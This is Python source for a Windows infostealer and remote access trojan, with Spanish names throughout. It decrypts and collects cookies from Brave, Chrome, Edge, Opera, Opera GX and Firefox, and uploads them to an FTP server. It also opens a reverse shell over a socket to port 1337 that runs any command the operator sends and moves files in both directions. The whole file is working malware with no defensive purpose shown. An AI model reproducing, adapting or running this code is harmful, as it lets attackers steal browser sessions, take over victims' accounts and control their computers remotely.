import socket, os, tempfile, sqlite3, json, time, subprocess
from ftplib import FTP
from base64 import b64decode
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

temp = tempfile.mkdtemp()

usuario = os.getlogin()

host = ""
port = 1337

ftp_user = "user"
ftp_pass = "pass"

ftp = FTP(host)
ftp.login(ftp_user, ftp_pass)
ftp.set_pasv(False)
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def carpeta():
    ftp.cwd("/home/arcadia/")
    try:
        ftp.mkd(f"{usuario}")
    except:
        print("s")
    ftp.cwd(f"/home/arcadia/{usuario}")


def clave(archivo):
    with open(archivo, "r", encoding="utf-8") as local_archivo:
        read_local = local_archivo.read()
    local_state = json.loads(read_local)
    clave = b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = clave[5:]
    encrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return encrypted_key

def decrypt_valor(valor, clave):
    iv = valor[3:15]
    payload = valor[15:]
    cifrado = AES.new(clave, AES.MODE_GCM, iv)
    desencriptar_clave =  cifrado.decrypt(payload)
    desencriptar_clave = desencriptar_clave[:-16]
    return desencriptar_clave.decode('utf-8')

def brave():
    try:

        carpeta = f"{os.getenv('localappdata')}\\BraveSoftware\\Brave-Browser\\User Data"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")
            cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                pass
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}brave({usuario})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
            orden.close()
            sql.close()
            archivo = open(f"{temp}{os.sep}brave({usuario})", "rb")
            ftp.storlines("STOR "+f"brave({usuario})", archivo)
            cliente.send("BRAVE: SUBIDO!".encode('utf-8'))
    except:
        cliente.send("BRAVE: ERROR".encode('utf-8'))

def chrome():
    try:
        carpeta = f"{os.getenv('localappdata')}\\Google\\Chrome\\User Data\\"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")
            cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                pass
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}chrome({usuario})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
            orden.close()
            sql.close()
            archivo = open(f"{temp}{os.sep}chrome({usuario})", "rb")
            ftp.storlines("STOR "+f"chrome({usuario})", archivo)
            cliente.send("CHROME: SUBIDO!".encode("utf-8"))
    except:
        cliente.send("CHROME: ERROR".encode('utf-8'))

def Edge():
    try:
        carpeta = f"{os.getenv('localappdata')}\\Microsoft\\Edge\\User Data"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")
            cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                pass
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}edge({usuario})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
            orden.close()
            sql.close()
            archivo = open(f"{temp}{os.sep}edge({usuario})", "rb")
            ftp.storbinary("STOR "+f"edge({usuario})", archivo)
            cliente.send("EDGE: SUBIDO!".encode("utf-8"))
    except:
        cliente.send("EDGE: ERROR".encode('utf-8'))

def Opera():
    try:
        carpeta = f"{os.getenv('appdata')}\\Opera Software\\Opera Stable"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")
            cookies = carpeta + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                pass
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}opera({usuario})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
            orden.close()
            sql.close()
            archivo = open(f"{temp}{os.sep}opera({usuario})", "rb")
            ftp.storlines("STOR "+f"opera({usuario})", archivo)
            cliente.send("OPERA: SUBIDO!".encode('utf-8'))
    except:
        cliente.send("OPERA: ERROR".encode('utf-8'))

def OperaGX():
    try:
        carpeta = f"{os.getenv('appdata')}\\Opera Software\\Opera GX Stable"
        if os.path.exists(carpeta):
            local_state = carpeta + os.sep + "Local State"
            if os.path.isfile(local_state):
                clave2 = clave(local_state)
                pass
            else:
                print("Local State no existe")
            cookies = carpeta + os.sep + "Network" + os.sep + "Cookies"
            if os.path.isfile(cookies):
                pass
            else:
                pass
            sql = sqlite3.connect(cookies)
            orden = sql.cursor()
            orden.execute("SELECT name, encrypted_value, host_key, expires_utc, is_httponly, is_secure, samesite, is_same_party, top_frame_site_key, priority FROM cookies")
            with open(f"{temp}{os.sep}operaGX({usuario})", "a", encoding="cp437", errors="ignore") as archivo_cookies:
                for cookies in orden.fetchall():
                    nombre = cookies[0]
                    valor = decrypt_valor(cookies[1], clave2)
                    domain = cookies[2]
                    expiracion = cookies[3]
                    httponly = cookies[4]
                    secure = cookies[5]
                    samesite = cookies[6]
                    sameparty = cookies[7]
                    partition_key = cookies[8]
                    prioridad = cookies[9]
                    archivo_cookies.write(f"SITIO: {domain}\n Name: {nombre}\n Value: {valor}\n Domain: {domain}\n Expire: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n SameParty: {sameparty}\n Partition Key: {partition_key}\n Priority: {prioridad}\n\n")
            orden.close()
            sql.close()
            archivo = open(f"{temp}{os.sep}operaGX({usuario})", "rb")
            ftp.storlines("STOR "+f"operaGX({usuario})", archivo)
            cliente.send("GX: SUBIDO!".encode('utf-8'))
    except:
        cliente.send("GX: ERROR".encode('utf-8'))


def mozilla():
    try:
        roaming = os.getenv("appdata")
        carpeta = f"{roaming}\\Mozilla\\Firefox\\Profiles"
        listar_perfiles = os.listdir(carpeta)
        for perfiles in listar_perfiles:
            cookies = 'cookies.sqlite'
            seleccionar_cookies = carpeta + os.sep + perfiles + os.sep + cookies
            if not os.path.exists(seleccionar_cookies):
                continue
            try:
                sql = sqlite3.connect(seleccionar_cookies)
            except:
                continue
            try:
                orden = sql.execute("SELECT name, value, host, path, expiry, isHttpOnly, isSecure, sameSite, lastAccessed FROM moz_cookies")
            except:
                continue

            with open(f"{temp}{os.sep}mozilla({usuario})", mode='a', newline='', encoding='utf-8') as cookies_txt:
                for columna in orden.fetchall():
                    nombre = columna[0]
                    valor = columna[1]
                    domain = columna[2]
                    path = columna[3]
                    expiracion = columna[4]
                    httponly = columna[5]
                    secure = columna[6]
                    samesite = columna[7]
                    ultimo_acceso = columna[8]
                    cookies_txt.write(f"SITIO: {domain}\n Nombre: {nombre}\n Valor: {valor}\n Domain: {domain}\n Path: {path}\n Expira: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n Ultimo Acceso: {ultimo_acceso}\n\n")
            orden.close()
            sql.close()
            archivo = open(f"{temp}{os.sep}mozilla({usuario})", "rb")
            ftp.storlines(f"STOR mozilla({usuario})", archivo)
            cliente.send("MOZILLA: SUBIDO!".encode('utf-8'))
    except:
        cliente.send("MOZILLA: ERROR".encode('utf-8'))

def escuchando():
    while True:
        peticion = cliente.recv(1024).decode('utf-8')
        if peticion == 'shell':
            try:
                while True:
                    comandos = cliente.recv(1024).decode('utf-8')
                    if comandos[:9] == 'descargar':
                        nombre = comandos[10:]
                        try:
                            archivo = open(f"{os.getcwd()}{os.sep}{nombre}", "rb")
                            ftp.storlines("STOR "+nombre, archivo)
                            cliente.send("listo!".encode('utf-8'))
                        except:
                            cliente.send("error al subir el archivo".encode('utf-8'))

                    if comandos[:5] == 'subir':
                        ftp.cwd("/home/arcadia/")
                        nombre = comandos[6:]
                        archivo = open(f"{temp}{os.sep}{nombre}", "wb")
                        try:
                            ftp.storbinary(f"STOR {nombre}", archivo)
                            cliente.send("se ha guardado en la carpeta '{temp}'".encode('utf-8'))
                        except:
                            cliente.send("error al subir el archivo".encode('utf-8'))
                        ftp.cwd(f"/home/arcadia/{usuario}")
                    if comandos[:2] == 'cd':
                        os.chdir(comandos[3:])
                    if len(comandos) > 0:
                        shell = subprocess.Popen(comandos[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        leer = shell.stdout.read()
                        salida = str(leer)
                        cliente.send(str.encode(salida + str(f"\n{os.getcwd()}")))
            except:
                   cliente.send("error".encode('utf-8'))

        if peticion == 'cookies':
            try:
                brave()
            except:
                pass
            try:
                chrome()
            except:
                pass
            try:
                Edge()
            except:
                pass
            try:
                Opera()
            except:
                pass
            try:
                OperaGX()
            except:
                pass
            try:
                mozilla()
            except:
                pass


def main():
    carpeta()
    while True:
        try:
            cliente.connect((host,port))
            escuchando()
        except:
            ftp.close()
            main()
main()
